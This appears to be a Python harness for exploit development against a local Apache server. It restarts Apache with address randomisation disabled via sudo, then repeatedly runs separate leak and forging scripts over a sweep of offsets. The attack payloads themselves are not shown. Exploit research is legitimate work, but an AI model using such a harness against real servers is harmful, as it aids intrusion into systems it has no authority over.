#!/usr/bin/env python3
import subprocess,time,sys
def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True)
def stopstart():
    sh("sudo -n apache2ctl -k stop >/dev/null 2>&1"); time.sleep(0.15)
    sh('sudo -n bash -c "setarch $(uname -m) -R /usr/sbin/apache2ctl -k start" >/dev/null 2>&1'); time.sleep(0.2)
for n in [0,16,32,64,96,128,192,256,384,512,640,768,832,864,880,896,912,928,944,960,976,984,992]:
    stopstart()
    sh("python3 send_a_leak3.py 1001 5 32 12 17 >/dev/null 2>&1"); time.sleep(0.08)
    r=sh(f"python3 b_forge64.py {n} 0x1000 M 2>&1")
    out=r.stdout.strip().replace('\n',' | ')
    print(f"N={n} {out[:160]}", flush=True)
